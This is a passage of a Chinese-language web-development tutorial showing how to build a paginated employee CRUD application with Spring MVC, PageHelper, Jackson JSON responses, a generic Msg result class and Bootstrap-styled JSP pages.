<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先要修改Controller<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 导入jackson包</span></span><br><span class="line"><span class="comment">    * @param pn</span></span><br><span class="line"><span class="comment">    * @return</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   @<span class="constructor">RequestMapping(<span class="string">"/emps"</span>)</span></span><br><span class="line">   @ResponseBody</span><br><span class="line">   public PageInfo get<span class="constructor">EmpsWithJson(@RequestParam(<span class="params">value</span> = <span class="string">"pn"</span>,<span class="params">defaultValue</span> = <span class="string">"1"</span>)</span>Integer pn)&#123;</span><br><span class="line">       <span class="comment">//这不是一个分页查询</span></span><br><span class="line">       <span class="comment">//引入PageHelper分页插件</span></span><br><span class="line">       <span class="comment">//在查询之前只需要调用,传入页码以及每页的个数</span></span><br><span class="line">       <span class="module-access"><span class="module"><span class="identifier">PageHelper</span>.</span></span>start<span class="constructor">Page(<span class="params">pn</span>,5)</span>;</span><br><span class="line">       <span class="comment">//startPage后面紧跟的这个查询就是一个分页查询</span></span><br><span class="line">       List&lt;Employee&gt; emps = employeeService.get<span class="constructor">All()</span>;</span><br><span class="line">       <span class="comment">//使用PageInfo包装查询后的结果，只需要将PageInfo交给页面就行了</span></span><br><span class="line">       <span class="comment">//封装了详细的分页信息，包括有我们查询出来的数据,连续显示的页数</span></span><br><span class="line">       PageInfo page= <span class="keyword">new</span> <span class="constructor">PageInfo(<span class="params">emps</span>,5)</span>;</span><br><span class="line">       return page;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>想要让ResponseBody实现，需要导入jackson包，在pom.xml中添加依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   jason包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>再次访问之前的页面，就会发现已经变成了json字符串了</p>
<p>但是这样只返回page，用户不知道自己是否操作成功，所以我们写一个通用的返回类<br>在bean下新建一个Msg.class<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.crud.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通用的返回类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Msg</span> &#123;</span></span><br><span class="line">    <span class="comment">//状态码 200-成功  404-失败</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> code;</span><br><span class="line">    <span class="comment">//提示信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> msg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用户要返回给浏览器的数据</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;<span class="keyword">String</span>,Object&gt; extend=<span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,Object&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Msg <span class="title">success</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Msg result=<span class="keyword">new</span> Msg();</span><br><span class="line">        result.setCode(<span class="number">200</span>);</span><br><span class="line">        result.setMsg(<span class="string">"处理成功!"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Msg <span class="title">fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Msg result=<span class="keyword">new</span> Msg();</span><br><span class="line">        result.setCode(<span class="number">404</span>);</span><br><span class="line">        result.setMsg(<span class="string">"处理失败！"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Msg <span class="title">add</span><span class="params">(<span class="keyword">String</span> key,Object value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.getExtend().<span class="built_in">put</span>(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(<span class="keyword">int</span> code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getMsg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMsg</span><span class="params">(<span class="keyword">String</span> msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map&lt;<span class="keyword">String</span>, Object&gt; getExtend() &#123;</span><br><span class="line">        <span class="keyword">return</span> extend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setExtend</span><span class="params">(Map&lt;<span class="keyword">String</span>, Object&gt; extend)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.extend = extend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将Controller修改为<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">@<span class="constructor">RequestMapping(<span class="string">"/emps"</span>)</span></span><br><span class="line">@ResponseBody</span><br><span class="line">public Msg get<span class="constructor">EmpsWithJson(@RequestParam(<span class="params">value</span> = <span class="string">"pn"</span>,<span class="params">defaultValue</span> = <span class="string">"1"</span>)</span>Integer pn)&#123;</span><br><span class="line">    <span class="comment">//这不是一个分页查询</span></span><br><span class="line">    <span class="comment">//引入PageHelper分页插件</span></span><br><span class="line">    <span class="comment">//在查询之前只需要调用,传入页码以及每页的个数</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">PageHelper</span>.</span></span>start<span class="constructor">Page(<span class="params">pn</span>,5)</span>;</span><br><span class="line">    <span class="comment">//startPage后面紧跟的这个查询就是一个分页查询</span></span><br><span class="line">    List&lt;Employee&gt; emps = employeeService.get<span class="constructor">All()</span>;</span><br><span class="line">    <span class="comment">//使用PageInfo包装查询后的结果，只需要将PageInfo交给页面就行了</span></span><br><span class="line">    <span class="comment">//封装了详细的分页信息，包括有我们查询出来的数据,连续显示的页数</span></span><br><span class="line">    PageInfo page= <span class="keyword">new</span> <span class="constructor">PageInfo(<span class="params">emps</span>,5)</span>;</span><br><span class="line">    return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>success<span class="literal">()</span>.add(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这样一来有了状态码和文字的返回效果，用户就知道是否操作成功了</p>
<p>接下来就是用ajax，dom来完成CRUD了</p>
<p>新建一个index.jsp<br>将之前list.jsp的内容复制过来<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"><span class="xml">    web路径：</span></span><br><span class="line"><span class="xml">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="xml">        以/开始的相对路径，找资源，以服务器的路径为标准（http://localhost:3306）需要加上项目名</span></span><br><span class="line"><span class="xml">            http://localhost:3306/crud</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> <span class="attr">prefix</span>=<span class="string">"c"</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        pageContext.setAttribute("APP_PATH",request.getContextPath());</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--标题--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--按钮--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--显示表格数据--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"emp"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empId&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.gender=="M"?"男":"女"&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.email&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.department.deptName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    编辑</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    删除</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--显示分页信息--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            分页文字信息<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                当前记录数：$</span><span class="template-variable">&#123;pageInfo.pageNum&#125;</span><span class="xml">页，总$</span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml">页,总$</span><span class="template-variable">&#123;pageInfo.total&#125;</span><span class="xml">条记录</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            分页条信息<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=1"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        有上一页再显示箭头，没有则不显示<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.hasPreviousPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum-1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;laquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        遍历显示页码，当前页码高亮<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.navigatepageNums&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"pageNumb"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb == pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb != pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        有下一页再显示箭头，没有则不显示<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.hasNextPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum+1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;raquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>末页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h4 id="员工信息"><a href="#员工信息" class="headerlink" title="员工信息"></a>员工信息</h4><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 